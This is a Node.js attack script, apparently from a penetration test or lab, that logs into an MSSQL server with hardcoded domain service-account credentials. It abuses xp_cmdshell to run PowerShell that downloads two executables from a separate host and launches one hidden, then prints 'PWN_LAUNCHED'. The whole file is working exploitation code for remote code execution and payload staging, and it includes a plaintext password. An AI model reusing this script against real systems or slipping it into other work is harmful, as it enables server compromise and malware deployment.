const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true, enableArithAbort: true },
    port: 1433,
    requestTimeout: 120000,
  });
  const q = async (s) => {
    try {
      const r = await sql.query(s);
      console.log("=>", JSON.stringify(r.recordset));
    } catch (e) {
      console.log("ERR", e.message);
    }
  };
  const base = "http://172.16.0.12:8080";
  await q(
    `EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri ${base}/s.exe -OutFile C:/Users/Public/s.exe -UseBasicParsing"'`
  );
  await q(
    `EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri ${base}/p.exe -OutFile C:/Users/Public/p.exe -UseBasicParsing"'`
  );
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public\\s.exe C:\\Users\\Public\\p.exe'");
  // non-blocking start so xp_cmdshell returns
  await q(
    "EXEC xp_cmdshell 'powershell -c \"Start-Process -FilePath C:\\\\Users\\\\Public\\\\p.exe -WindowStyle Hidden\"'"
  );
  console.log("PWN_LAUNCHED");
  process.exit(0);
})().catch((e) => {
  console.log("FATAL", e);
  process.exit(1);
});
